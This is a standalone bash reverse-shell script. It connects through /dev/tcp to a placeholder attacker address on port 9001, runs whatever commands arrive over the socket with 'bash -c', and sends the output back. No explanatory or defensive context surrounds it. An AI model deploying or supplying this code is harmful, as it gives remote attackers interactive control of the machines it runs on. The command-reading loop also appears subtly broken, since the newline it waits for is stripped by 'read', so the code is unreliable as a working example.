#Linux / Unix
#!/bin/bash

LHOST="IP_ADDRESS"
LPORT=9001

# Function to execute commands and send output back
execute_command() {
    local cmd="$1"
    local output
    output=$(bash -c "$cmd" 2>&1)
    echo -e "$output\n"
}

main() {
    # Create TCP connection using exec and /dev/tcp
    exec 3<>/dev/tcp/$LHOST/$LPORT
    if [ $? -ne 0 ]; then
        echo "Connection error"
        exit 1
    fi

    code=""
    while true; do
        # Use timeout and read to check for data availability with non-blocking read
        if read -t 0.1 -r -u 3 data; then
            code+="$data"
            # Check if code contains newline (complete command)
            if [[ "$code" == *$'\n'* ]]; then
                # Trim whitespace
                cmd=$(echo -e "$code" | sed '/^\s*$/d' | tr -d '\r\n')
                if [ -n "$cmd" ]; then
                    output=$(execute_command "$cmd")
                    # Send output back
                    echo -ne "$output" >&3
                fi
                code=""
            fi
        fi

        # Check if connection is alive by sending empty data (no direct equivalent, so try to write empty string)
        if ! echo -ne "" >&3 2>/dev/null; then
            break
        fi

        sleep 0.1
    done

    # Close the connection
    exec 3>&-
    exec 3<&-
}

main